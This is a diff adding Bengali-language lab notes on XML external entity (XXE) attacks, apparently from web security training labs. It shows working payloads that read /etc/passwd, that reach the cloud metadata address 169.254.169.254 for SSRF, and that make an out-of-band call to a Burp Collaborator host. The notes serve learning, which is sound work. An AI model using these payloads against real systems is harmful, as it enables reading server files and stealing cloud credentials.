@@ -1,0 +1,30 @@
+                             Exploiting XXE using external entities to retrieve files
+#poduct স্টক চেক করতে হবে। সেই খাবে <?xml এই ধরেনের লেখা থাকলে xxe কিরা যায় ।
+    এই ধরনের একটা structure থাকবে ->   
+                    <?xml version="1.0" encoding="UTF-8"?>
+                    <stockCheck>
+                        <productId>1</productId>
+                        <storeId>2</storeId>
+                    </stockCheck>
+    এইখানে আমরা <?xml version="1.0" encoding="UTF-8"?> নিচে এই লেখাটি paste করে দিব 
+                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    তারপর আমরা productId 1 জায়াগায় &xxe;দিতে হবে। 
+    example~
+                <?xml version="1.0" encoding="UTF-8"?>
+                <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+                    <stockCheck>
+                        <productId>&xxe;</productId>
+                        <storeId>2</storeId>
+                    </stockCheck>
+
+
+                      *  Exploiting XXE to perform SSRF attacks*
+# এই ল্যাবটী আগের টার মতই । শুধু <?xml version="1.0" encoding="UTF-8"?> নিচে এই লেখাটি paste করে দিতে হবে।
+                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+                    তারপর আমরা respone a "Invalid product ID: admin" এই ধরেনের লেখা পাবো।এইখানে admin টা হলো path ,যেটা আমরা ip address এর পর দিবে। example: 169.254.169.254/admin । তাহলে আমরা responseএর ভিতর sensetice info পাবো।
+
+                    *Blind XXE with out-of-band interaction*
+#এই ল্যাবটী প্রথম ল্যাবটির মতই।শুধু <?xml version="1.0" encoding="UTF-8"?> নিচে এই লেখাটি paste করে দিতে হবে।সাথে url এর জায়াগায় burpCollaboration দিতে হবে।
+                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://burpCollaboration.com"> ]>
+    note: আগে porxy->options->server_response অন করে দিতে হবে।
+
